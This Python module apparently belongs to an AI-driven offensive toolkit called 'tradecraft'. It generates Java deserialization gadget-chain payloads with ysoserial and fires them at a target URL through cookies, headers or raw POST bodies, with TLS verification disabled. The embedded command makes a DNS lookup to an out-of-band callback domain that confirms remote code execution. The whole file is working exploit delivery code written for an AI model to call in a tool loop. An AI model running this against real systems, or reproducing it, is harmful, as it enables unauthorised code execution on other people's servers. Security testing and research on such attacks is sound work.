"""
Subprocess + HTTP execution for deserialization_probe: generates one Java
gadget-chain payload with ysoserial, then delivers it to up to
parse.MAX_CARRIERS candidate injection points in sequence (or one explicit
carrier). No parsing logic here -- see parse.py for carrier/payload_type
validation and result shaping.

Confirmation is intentionally NOT synchronous. A Java deserialization sink
does not echo command output back in the HTTP response the way the PHP
`id`-confirmation tools here do (phpggc, fastcgi_exploit) -- the embedded
command is an out-of-band DNS lookup against an interactsh domain the model
already generated and supplies as oob_domain. This adapter never registers
its own interactsh client and never sleeps waiting for a callback: Tradecraft
is a single continuous tool-calling loop, not a staged pipeline, and the
existing generate -> inject -> poll split (see
tradecraft/skills/ssrf_open_redirect_discovery.md) already relies on the
model's own next turn to provide that wait, not a blocking call inside one
tool's execution.
"""
from __future__ import annotations

import os
import subprocess
from typing import List, Optional, Tuple

import requests
import urllib3

from tradecraft.adapters.deserialization_probe import parse as deser_parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

YSOSERIAL_JAR_PATH = "/opt/ysoserial/ysoserial.jar"
YSOSERIAL_JAR_ENV = "YSOSERIAL_JAR"

# ysoserial's gadget-chain generation uses reflection to reach into JDK
# internals (e.g. java.util.HashSet's private "map" field) that the JDK 9+
# module system blocks by default. Without these flags, every invocation
# exits with "InaccessibleObjectException: ... does not open java.util to
# unnamed module".
YSOSERIAL_JVM_FLAGS = [
    "--add-opens=java.base/java.util=ALL-UNNAMED",
    "--add-opens=java.base/java.lang=ALL-UNNAMED",
    "--add-opens=java.base/java.lang.reflect=ALL-UNNAMED",
    "--add-opens=java.base/java.io=ALL-UNNAMED",
    "--add-opens=java.base/java.net=ALL-UNNAMED",
    "--add-opens=java.base/java.security=ALL-UNNAMED",
    "--add-opens=java.management/com.sun.jmx.mbeanserver=ALL-UNNAMED",
    "--add-opens=jdk.naming.rmi/com.sun.jndi.rmi.registry=ALL-UNNAMED",
]

# Hard caps on this call's blast radius, independent of --allow-destructive:
# one payload generation, a bounded number of HTTP injection attempts,
# bounded subprocess/HTTP time, bounded payload size. The flag controls
# availability, not how much one call can do -- see docs/policy.md.
YSOSERIAL_TIMEOUT_SECONDS = 60
HTTP_TIMEOUT_SECONDS = 15
MAX_PAYLOAD_BYTES = 262144

_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) tradecraft/1.0"


def find_jar() -> Optional[str]:
    """ysoserial jar path: YSOSERIAL_JAR override first, then the
    project's conventional /opt/ysoserial/ysoserial.jar install location --
    same env-override-then-conventional-path shape phpggc's find_script()
    already uses."""
    for candidate in (os.environ.get(YSOSERIAL_JAR_ENV, ""), YSOSERIAL_JAR_PATH):
        if candidate and os.path.isfile(candidate):
            return candidate
    return None


def generate_payload(jar_path: str, gadget: str, command: str) -> Tuple[bytes, Optional[str]]:
    """Runs ysoserial once. Returns (payload_bytes, error) -- error is
    None only when a real, non-empty, size-bounded payload came back.
    An invalid gadget name exits non-zero (64) with an empty stdout and
    the error detail on stderr -- the opposite of phpggc's own CLI, which
    puts its error on stdout with a zero-ish exit."""
    argv = ["java", *YSOSERIAL_JVM_FLAGS, "-jar", jar_path, gadget, command]
    try:
        proc = subprocess.run(
            argv,
            capture_output=True,
            timeout=YSOSERIAL_TIMEOUT_SECONDS,
            stdin=subprocess.DEVNULL,
        )
    except FileNotFoundError:
        return b"", "java executable not found on PATH"
    except subprocess.TimeoutExpired:
        return b"", f"ysoserial payload generation timed out after {YSOSERIAL_TIMEOUT_SECONDS}s"
    except OSError as exc:
        return b"", f"ysoserial execution failed: {exc}"

    if proc.returncode != 0 or not proc.stdout:
        detail = (proc.stderr or b"")[:2000].decode("utf-8", errors="ignore").strip()
        # ysoserial's own usage dump (printed on an invalid gadget name) is
        # many lines long -- keep only its first line, the actual error,
        # not the whole payload-type table that follows it.
        first_line = detail.splitlines()[0] if detail else "no output"
        return b"", f"ysoserial payload generation failed (exit {proc.returncode}): {first_line}"

    payload = proc.stdout
    if len(payload) > MAX_PAYLOAD_BYTES:
        return b"", (
            f"generated payload is {len(payload)} bytes, over the "
            f"{MAX_PAYLOAD_BYTES}-byte cap for one call"
        )
    return payload, None


def deliver(
    url: str,
    carriers: List[Tuple[str, str]],
    payload: bytes,
    payload_b64: str,
    session: Optional[requests.Session] = None,
) -> List[dict]:
    """Fires the payload at each candidate carrier in sequence, one HTTP
    request per carrier. Never retries a carrier, and a request-level
    exception on one carrier is recorded against that carrier only --
    the remaining candidates are still tried, unlike wrapping the whole
    loop in one try/except (which would let a down connection on the
    first carrier silently abandon every other one)."""
    close_session = False
    if session is None:
        session = requests.Session()
        close_session = True

    attempts: List[dict] = []
    try:
        for kind, name in carriers:
            label = f"{kind}:{name}" if name else kind
            headers = {"User-Agent": _USER_AGENT}
            try:
                if kind == "cookie":
                    headers["Cookie"] = f"{name}={payload_b64}"
                    resp = session.get(
                        url, headers=headers, timeout=HTTP_TIMEOUT_SECONDS,
                        verify=False, allow_redirects=False,
                    )
                elif kind == "header":
                    headers[name] = payload_b64
                    resp = session.get(
                        url, headers=headers, timeout=HTTP_TIMEOUT_SECONDS,
                        verify=False, allow_redirects=False,
                    )
                else:  # raw serialized body, sent unencoded
                    headers["Content-Type"] = "application/x-java-serialized-object"
                    resp = session.post(
                        url, data=payload, headers=headers, timeout=HTTP_TIMEOUT_SECONDS,
                        verify=False, allow_redirects=False,
                    )
                attempts.append({"carrier": label, "status_code": resp.status_code, "error": None})
            except requests.RequestException as exc:
                attempts.append({"carrier": label, "status_code": None, "error": str(exc)})
    finally:
        if close_session:
            session.close()
    return attempts


def execute(
    target: str,
    oob_domain: str,
    payload_type: str = "",
    carrier: str = "",
    session: Optional[requests.Session] = None,
) -> deser_parse.RawDeserializationProbeResult:
    url = deser_parse.normalize_target_url(target)
    if not url:
        return deser_parse.RawDeserializationProbeResult(error="empty target URL")

    domain, domain_error = deser_parse.validate_oob_domain(oob_domain)
    if domain_error:
        return deser_parse.RawDeserializationProbeResult(target=url, error=domain_error)

    gadget, type_error = deser_parse.validate_payload_type(payload_type)
    if type_error:
        return deser_parse.RawDeserializationProbeResult(target=url, oob_domain=domain, error=type_error)

    carriers, carrier_error = deser_parse.resolve_carriers(carrier)
    if carrier_error:
        return deser_parse.RawDeserializationProbeResult(
            target=url, gadget=gadget, oob_domain=domain, error=carrier_error,
        )

    jar_path = find_jar()
    if not jar_path:
        return deser_parse.RawDeserializationProbeResult(
            target=url, gadget=gadget, oob_domain=domain,
            error=f"ysoserial jar not found at {YSOSERIAL_JAR_PATH}",
        )

    command = f"nslookup {domain}"
    payload, gen_error = generate_payload(jar_path, gadget, command)
    if gen_error:
        return deser_parse.RawDeserializationProbeResult(
            target=url, gadget=gadget, oob_domain=domain, error=gen_error,
        )

    payload_b64 = deser_parse.encode_payload(payload)
    attempts = deliver(url, carriers, payload, payload_b64, session=session)

    return deser_parse.RawDeserializationProbeResult(
        target=url,
        gadget=gadget,
        oob_domain=domain,
        payload_b64=payload_b64,
        attempts=attempts,
    )
